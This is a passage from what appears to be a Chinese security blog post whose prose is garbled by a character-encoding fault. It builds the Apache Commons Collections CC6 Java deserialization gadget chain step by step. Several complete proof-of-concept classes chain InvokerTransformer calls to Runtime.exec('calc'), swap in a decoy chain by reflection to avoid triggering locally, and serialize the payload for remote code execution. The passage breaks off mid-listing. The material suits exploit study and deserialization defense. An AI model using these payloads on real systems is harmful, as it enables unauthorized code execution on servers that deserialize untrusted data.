class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br><span class="hljs-comment">//                , new ConstantTransformer(1)</span><br>        &#125;);<br><br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        Map decorate = LazyMap.decorate(hm, chainedTransformer);<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(decorate, <span class="hljs-string">&quot;a&quot;</span>);<br><span class="hljs-comment">//        tiedMapEntry.toString();//CC5</span><br>        tiedMapEntry.hashCode();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ÂêåÊ†∑ÁöÑÔºåÊàë‰ª¨ÈúÄË¶Å‰∏Ä‰∏™Á±ªÊù•Ë∞ÉÁî®ÂÖ∂<code>hashCode</code>ÊñπÊ≥ïÔºåCC6 ‰ΩøÁî®ÁöÑÊòØ<code>HashMap.hash</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> <span class="hljs-title">hash</span><span class="hljs-params">(Object key)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> h;<br>    <span class="hljs-keyword">return</span> (key == <span class="hljs-keyword">null</span>) ? <span class="hljs-number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="hljs-number">16</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ËøôÈáå key Âπ∂‰∏çÂèØÊéßÔºåËøòÂæóÊâæË∞ÉÁî®ÂÖ∂<code>hash</code>ÊñπÊ≥ïÔºåËøòÊòØ<code>HashMap</code>‰∏≠ÁöÑ<code>put</code>ÊñπÊ≥ï</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> V <span class="hljs-title">put</span><span class="hljs-params">(K key, V value)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> putVal(hash(key), key, value, <span class="hljs-keyword">false</span>, <span class="hljs-keyword">true</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>Áé∞Âú®ÈúÄË¶ÅÊâæÂà∞‰∏Ä‰∏™Ë∞ÉÁî®‰∫Ü<code>HashMap.put</code>Âπ∂‰∏îÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞ÂèØÊéßÁöÑÊñπÊ≥ïÔºåÊúÄÁªàÊâæÂà∞‰∫Ü<code>HashSet</code>Â§çÂÜôÁÇπ‰∏≠ÁöÑ<code>put</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">HashSet</span><span class="hljs-params">()</span> </span>&#123;<br>       map = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>   &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span></span>&#123;<br>       ...<br>       <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>; i&lt;size; i++) &#123;<br>           <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>               E e = (E) s.readObject();<br>           map.put(e, PRESENT);<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure>

<p><code>e</code>Â¶Ç‰ΩïÊéßÂà∂Âë¢ÔºåÁúãÁúã<code>writeObject</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">writeObject</span><span class="hljs-params">(java.io.ObjectOutputStream s)</span></span><br><span class="hljs-function">    <span class="hljs-keyword">throws</span> java.io.IOException </span>&#123;<br>    <span class="hljs-comment">// Write out any hidden serialization magic</span><br>    s.defaultWriteObject();<br><br>    <span class="hljs-comment">// Write out HashMap capacity and load factor</span><br>    s.writeInt(map.capacity());<br>    s.writeFloat(map.loadFactor());<br><br>    <span class="hljs-comment">// Write out size</span><br>    s.writeInt(map.size());<br><br>    <span class="hljs-comment">// Write out all elements in the proper order.</span><br>    <span class="hljs-keyword">for</span> (E e : map.keySet())<br>        s.writeObject(e);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ÊòØÈÄöËøá<code>map.keySet</code>Â¢ûÂº∫ for ÂÜôÂÖ•ÁöÑÔºåÂõ†Ê≠§<code>HashMap</code>‰∏≠Ë¶ÅË∞ÉÁî®<code>keySet</code>ÊñπÊ≥ïÂπ∂‰º†ÂÖ•‰ªªÊÑèÂÄº</p>
<p>Êï¥‰∏™ÈìæÊù°Ê∏ÖÊô∞‰∫ÜÔºåÊàë‰ª¨Ê≥®ÊÑèÂà∞<code>HashMap.put</code>Ë∞ÉÁî®<code>HashMap.hash</code>ÁöÑËøáÁ®ãÂæàÁÜüÊÇâÔºåÊ≤°ÈîôÊ≠£ÊòØ<code>URLDNS</code>Èìæ‰∏≠ÁöÑÂÜÖÂÆπÔºåÂÖ∂ÂÆûÂ∑≤ÁªèÂ∞±ÂèØ‰ª•ÈÄöËøá<code>HashMap.readObject</code>Êù•Ë∞ÉÁî®‰∫Ü</p>
<p>ÂèÇËÄÉÔºö<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43263451/article/details/126073035">1</a> <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43610673/article/details/125079601">2</a></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//yso CC6: HashSet.readObject-&gt;HashMap.put-&gt;HashMap.hash</span><br>	<span class="hljs-function"><span class="hljs-keyword">public</span> V <span class="hljs-title">put</span><span class="hljs-params">(K key, V value)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> putVal(hash(key), key, value, <span class="hljs-keyword">false</span>, <span class="hljs-keyword">true</span>);<br>    &#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//URLDNS: HashMap.readObject-&gt;HashMap.hash</span><br>	<span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span></span><br><span class="hljs-function">			...</span><br><span class="hljs-function">            <span class="hljs-title">for</span> <span class="hljs-params">(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; mappings; i++)</span> </span>&#123;<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    K key = (K) s.readObject();<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    V value = (V) s.readObject();<br>                putVal(hash(key), key, value, <span class="hljs-keyword">false</span>, <span class="hljs-keyword">false</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>Âõ†Ê≠§ÂÖàÊù•‰∏™ÁÆÄÂçïÁöÑ poc(URLDNS ÂºèÔºåÂéüË∞ÖÊàëËøôÊ†∑Â§áÊ≥®ÂÆÉ)</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC6;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC6Ez</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;),<br>                <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)<br>        &#125;);<br><br><br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        Map decorate = LazyMap.decorate(hm,chainedTransformer);<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(decorate, <span class="hljs-string">&quot;a&quot;</span>);<br>        HashMap exphm = <span class="hljs-keyword">new</span> HashMap();<br>        exphm.put(tiedMapEntry,<span class="hljs-string">&quot;c&quot;</span>);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(exphm);<br>        oos.flush();<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br><span class="hljs-comment">//        ois.readObject();</span><br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>Âà∞ËøôÈáåÂ∞±ÂÆå‰∫ÜÔºüÂÖ∂ÂÆûËøòÊòØÁºñÂÜôËøáÁ®ã‰∏≠Ê≤°ÊúâÂà∞Ëææ<code>ois.readObject</code>Â∞±Â∑≤ÁªèËß¶ÂèëÔºå‰πüÂ∞±ÊòØËØ¥Ê≤°ÊúâËßÑÈÅøÂà∞Êú¨Âú∞Ëß¶ÂèëÔºå‰∏ç‰ø°ÂèØ‰ª•Ê≥®Èáä<code>ois.readObject</code>Êàë‰ª¨ÂèëÁé∞ÂéãÊ†πÊ≤°ÊúâÂèçÂ∫èÂàóÂåñ RCE ÊàêÂäüÔºåÈÇ£Â∞±Âä†‰∏Ä‰∏™ÂÅáÈìæÔºåÂ¶Ç‰∏ãÔºö</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC6;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC6EzbyP</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;),<br>                <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)<br>        &#125;;<br>        ChainedTransformer fakechainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)&#125;);<br><br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        Map decorate = LazyMap.decorate(hm,fakechainedTransformer);<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(decorate, <span class="hljs-string">&quot;a&quot;</span>);<br>        HashMap exphm = <span class="hljs-keyword">new</span> HashMap();<br>        exphm.put(tiedMapEntry,<span class="hljs-string">&quot;c&quot;</span>);<br><br>        Field iTransformersF = ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        iTransformersF.setAccessible(<span class="hljs-keyword">true</span>);<br>        iTransformersF.set(fakechainedTransformer,transformers);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(exphm);<br>        oos.flush();<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>Ê≥®ÊÑèËøô‰∏™ÂèçÂ∞Ñ‰øÆÊîπ‰º†ÂÖ•ÁöÑÊòØ<code>Transformer[]</code>Ôºå‰∏çÈúÄË¶ÅÂÜç chain ‰∏Ä‰∏ã‰∫Ü</p>
<p>Áé∞Âú®Â∞±ÊòØÂ•Ω‰∫ÜÔºå‰ΩÜÊòØ‰∏∫‰ªÄ‰πàÊ≤°ÊúâÊâßË°åÊàêÂäüÔºåÊåâÁùÄ p ÁâõÊÄùË∑ØË∞ÉËØïÔºåÊñ≠ÁÇπ<code>readObject</code>Ê≠•ÂÖ•Ôºå<code>LazyMap.get</code>ÊñπÊ≥ïÂÜÖ</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220925211304382.png" srcset="/img/loading.gif" lazyload></p>
<p>if Âà§Êñ≠ËøõÂéª‰∫ÜËÄåÊ≤°ÊúâË∞ÉÁî®<code>map.get</code>ÔºåËøô‰∏™<code>LazyMap</code>Âú®Âì™ÈáåÂ≠ò‰∫ÜÂÄºÂë¢ÔºåÊ≠£Â¶Ç yso Âà©Áî®ÊñπÂºè<code>HashSet.readObject-&gt;HashMap.put-&gt;HashMap.hash</code>Ôºå‰πüÂ∞±ÊòØÊàë‰ª¨Âú®ËßÑÈÅøÊú¨Âú∞Ëß¶ÂèëÁöÑËøáÁ®ã‰∏≠ÔºåÊàë‰ª¨‰πüË∞ÉÁî®Âà∞‰∫Ü<code>HashMap.put</code>!</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">exphm.put(tiedMapEntry,<span class="hljs-string">&quot;c&quot;</span>);<br></code></pre></td></tr></table></figure>

<p>ËøôÂ∞±ÂØºËá¥‰∫Ü<code>yso CC6: HashSet.readObject-&gt;HashMap.put-&gt;HashMap.hash </code>Âú®ËøôÈáå‰πüË¢´Ë∞ÉÁî®‰∫Ü‰∏ÄÊ¨°ÔºåËÄå‰∏îÂõ†‰∏∫ËßÑÈÅøÁî®ÁöÑ<code>fakeChainedTransform</code>Âú®ËøôÈáå‰∫ßÁîü‰∫ÜÂΩ±ÂìçËÄåÊ≤°ÊúâËß¶ÂèëÂëΩ‰ª§ÊâßË°åÔºåËß£ÂÜ≥ÊñπÊ≥ï‰πüÁÆÄÂçïÔºåÂú®Â∫èÂàóÂåñÂâçÁßªÈô§Ëøô‰∏™ÈîÆ</p>
<h3 id="Gadget-5"><a href="#Gadget-5" class="headerlink" title="Gadget"></a>Gadget</h3><h4 id="‚ë†p-ÁâõÁÆÄÂåñ"><a href="#‚ë†p-ÁâõÁÆÄÂåñ" class="headerlink" title="‚ë†p ÁâõÁÆÄÂåñ"></a>‚ë†p ÁâõÁÆÄÂåñ</h4><p><code>HashMap+HashMap</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC6;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC6EzbyP</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;),<br>                <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)<br>        &#125;;<br>        ChainedTransformer fakechainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)&#125;);<br><br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        Map decorate = LazyMap.decorate(hm,fakechainedTransformer);<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(decorate, <span class="hljs-string">&quot;a&quot;</span>);<br><br>        HashMap exphm = <span class="hljs-keyword">new</span> HashMap();<br>        exphm.put(tiedMapEntry,<span class="hljs-string">&quot;c&quot;</span>);<br><br>        decorate.remove(<span class="hljs-string">&quot;a&quot;</span>);<br><span class="hljs-comment">//        decorate.clear();</span><br><br>        Field iTransformersF = ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        iTransformersF.setAccessible(<span class="hljs-keyword">true</span>);<br>        iTransformersF.set(fakechainedTransformer,transformers);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(exphm);<br>        oos.flush();<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="‚ë°-ÁôΩË¢çÂ∏àÂÇÖÊîπ-yso"><a href="#‚ë°-ÁôΩË¢çÂ∏àÂÇÖÊîπ-yso" class="headerlink" title="‚ë° ÁôΩË¢çÂ∏àÂÇÖÊîπ yso"></a>‚ë° ÁôΩË¢çÂ∏àÂÇÖÊîπ yso</h4><p>ÂæàÂÉè yso ÁöÑÈìæÔºåÁÖßÁå´ÁîªËôé</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC6;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> 